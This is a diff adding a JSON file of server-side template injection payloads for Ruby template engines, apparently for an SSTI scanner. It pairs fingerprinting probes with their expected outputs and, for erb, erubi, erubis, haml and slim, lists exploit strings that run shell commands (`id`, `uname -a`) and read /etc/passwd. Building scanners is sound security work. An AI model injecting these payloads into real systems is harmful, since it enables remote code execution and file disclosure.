@@ -1,0 +1,67 @@
+{
+  "erb": {
+    "payloads": {
+      "<%=7*7%>" :"49",
+      "<%=\"yes\" if 1%>" : "yes"
+    },
+    "exploit": {
+      "rce": "<%=`id`%>",
+      "LFI": "<%= File.read('/etc/passwd') %>"
+    }
+  },
+  "erubi": {
+    "payloads": {
+      "<%=7*7%>" :"49",
+      "<%=\"yes\" if 1%>": "yes"
+    },
+    "exploit": {
+      "rce": "<%=`id`%>",
+      "LFI": "<%= File.read('/etc/passwd') %>"
+    }
+  },
+  "erubis": {
+    "payloads": {
+      "<%=7*7%>" :"49",
+      "<%=\"yes\" if 1%>": "yes"
+    },
+    "exploit": {
+      "rce": "<%=`id`%>",
+      "LFI": "<%= File.read('/etc/passwd') %>"
+    }
+  },
+  "haml": {
+    "payloads": {
+      "= 7 * 7" :"49",
+      "%p yes": "<p>yes</p>"
+    },
+    "exploit": {
+      "rce" : "= `uname -a`"
+    }
+  },
+  "liquid_rb": {
+    "payloads": {
+      "{{7|times:7}}" :"49",
+      "{{if true}}yes{{/if}}": "yes",
+      "{{@if(true)}}yes{{/if}}" : "yes",
+      "{{^missing}}yes{{/missing}}" : "yes"
+    },
+    "exploit": {
+    }
+  },
+  "mustache_rb": {
+    "payloads": {
+      "{{^missing}}yes{{/missing}}" : "yes"
+    },
+    "exploit": {
+    }
+  },
+  "slim": {
+    "payloads": {
+      "= 7 * 7" :"49",
+      "p yes" :"<p>yes</p>"
+    },
+    "exploit": {
+      "rce" : "= `uname -a`"
+    }
+  }
+}
